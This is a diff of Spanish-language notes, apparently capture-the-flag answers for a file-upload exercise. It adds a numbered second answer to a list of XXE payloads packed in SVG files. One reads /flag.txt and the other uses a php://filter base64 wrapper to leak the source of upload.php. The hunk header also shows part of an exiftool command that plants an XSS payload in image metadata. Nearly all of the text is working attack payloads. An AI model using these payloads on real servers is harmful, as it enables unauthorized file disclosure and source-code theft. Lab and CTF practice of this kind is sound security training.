@@ -29,9 +29,16 @@ exiftool -Comment=' "><img src=1
 
 ## Respuestas 
 
+1)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
 <svg>&xxe;</svg>
 ```
 
+2)
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
